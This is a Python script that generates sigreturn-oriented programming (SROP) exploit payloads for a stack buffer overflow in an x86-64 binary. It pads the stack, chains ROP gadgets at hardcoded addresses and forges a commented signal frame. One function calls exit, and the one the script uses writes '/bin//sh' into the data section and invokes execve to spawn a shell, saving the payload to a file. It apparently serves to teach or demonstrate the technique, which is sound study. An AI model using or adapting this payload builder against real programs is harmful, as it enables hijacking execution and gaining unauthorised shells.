#!/usr/bin/env python3

import struct

def exit():
    
    # Junk
    payload = b''
    payload += b'\x41' * 120

    # Creation of fake signal-frame
    # 1. function's Return-Address overwritten with call to sigreturn
    payload += struct.pack('<Q', 0x00000000004005af)    # pop rax ; ret
    payload += struct.pack('<Q', 15)                    # sigreturn's system call number
    payload += struct.pack('<Q', 0x00000000004012cc)    # syscall

    # 2. Rest of the fake signal-frame
    
    # 1. ucontext                                              
    payload += struct.pack('<Q', 0x0000000000000007)    # uc_flags              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_link               
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_sp        
    payload += struct.pack('<Q', 0x0000ffff00000000)    # uc_stack.ss_flags     
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_size      
                                                                                
    # 2. General Purpose Registers                                              
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R8                    
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R9                    
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R10                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R11                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R12                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R13                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R14                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R15
    
    # 3. exit's first argument
    payload += struct.pack('<Q', 1)                     # RDI = 1
    
    # 4. Dummy values again
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RSI            
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBP                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBX                   
    payload += struct.pack('<Q', 0x0000000000000000)    # RDX = NULL            
                                                                                
    # 5. exit()'s system call number                                          
    payload += struct.pack('<Q', 60)                    # RAX = exit's system call number = 60
                                                                                
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RCX                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RSP                   
                                                                                
    # 5. Finally what to execute                                                
    payload += struct.pack('<Q', 0x00000000004012cc)    # RIP = should call 'syscall' instruction
                                                                                
    # Rest of it                                                                
    payload += struct.pack('<Q', 0x0000000000000202)    # EFLAGS - Some value   
    payload += struct.pack('<Q', 0x002b000000000033)    # Segment Registers(SS, FS, GS, CS)
    payload += struct.pack('<Q', 0x0000000000000000)    # ERR                   
    payload += struct.pack('<Q', 0x0000000000000001)    # TrapNo                
    payload += struct.pack('<Q', 0x0000000000000000)    # Old-Mask              
    payload += struct.pack('<Q', 0x0000000000000000)    # CR2                   
    payload += struct.pack('<Q', 0x0000000000000000)    # fpstate = NULL        
    payload += struct.pack('<Q', 0x000000000000000e)    # reserved              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_sigmask            
 
    return payload

def execve():                                                                   
                                                                                
    # Add the initial junk                                                      
    payload = b''                                                               
    payload += b'\x41' * 120                                                    
                                                                                
    # Writing the string "/bin//sh" into the data section.                      
    payload += struct.pack('<Q', 0x0000000000410213) # pop rsi ; ret
    payload += struct.pack('<Q', 0x00000000006b90e0) # @ .data
    payload += struct.pack('<Q', 0x00000000004005af) # pop rax ; ret
    payload += b'/bin//sh'
    payload += struct.pack('<Q', 0x000000000047f291) # mov qword ptr [rsi], rax ; ret
    payload += struct.pack('<Q', 0x0000000000410213) # pop rsi ; ret
    payload += struct.pack('<Q', 0x00000000006b90e8) # @ .data + 8
    payload += struct.pack('<Q', 0x0000000000444330) # xor rax, rax ; ret
    payload += struct.pack('<Q', 0x000000000047f291) # mov qword ptr [rsi], rax ; ret

    # __restore_rt is generally not found in binaries.                          
    # Let us use Gadgets (ROP-style) and get it done.                           
    # 1. function's Return-Address overwritten with call to sigreturn
    payload += struct.pack('<Q', 0x00000000004005af)    # pop rax ; ret
    payload += struct.pack('<Q', 15)                    # sigreturn's system call number
    payload += struct.pack('<Q', 0x00000000004012cc)    # syscall
    
    # Rest of the fake signal-frame
    # 1. ucontext                                                               
    payload += struct.pack('<Q', 0x0000000000000007)    # uc_flags              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_link               
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_sp        
    payload += struct.pack('<Q', 0x0000ffff00000000)    # uc_stack.ss_flags     
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_size      
                                                                                
    # 2. General Purpose Registers                                              
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R8                    
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R9                    
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R10                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R11                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R12                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R13                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R14                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R15
    
    # 3. First argument for execve() = location of "/bin//sh"                   
    payload += struct.pack('<Q', 0x00000000006b90e0)    # RDI = location of "/bin//sh"
                                                                                
    # 4. Second argument for execve() = NULL                                    
    payload += struct.pack('<Q', 0x0000000000000000)    # RSI = NULL            
                                                                                
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBP                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBX                   
                                                                                
    # 5. Third argument for execve() = NULL                                     
    payload += struct.pack('<Q', 0x0000000000000000)    # RDX = NULL            
                                                                                
    # 5. execve()'s system call number                                          
    payload += struct.pack('<Q', 0x000000000000003b)    # RAX = execve's system call number = 59
                                                                                
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RCX                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RSP                   
                                                                                
    # 5. Finally what to execute                                                
    payload += struct.pack('<Q', 0x00000000004012cc)    # RIP = should call 'syscall' instruction
                                                                                
    # Rest of it                                                                
    payload += struct.pack('<Q', 0x0000000000000202)    # EFLAGS - Some value   
    payload += struct.pack('<Q', 0x002b000000000033)    # Segment Registers(SS, FS, GS, CS)
    payload += struct.pack('<Q', 0x0000000000000000)    # ERR                   
    payload += struct.pack('<Q', 0x0000000000000001)    # TrapNo                
    payload += struct.pack('<Q', 0x0000000000000000)    # Old-Mask              
    payload += struct.pack('<Q', 0x0000000000000000)    # CR2                   
    payload += struct.pack('<Q', 0x0000000000000000)    # fpstate = NULL        
    payload += struct.pack('<Q', 0x000000000000000e)    # reserved              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_sigmask            
                                                                                
    # Ignoring siginfo.                                                         
    
    return payload

if __name__ == '__main__':
    
    payload = execve()
    fo = open('payload.txt', 'wb')
    fo.write(payload)
    fo.close()
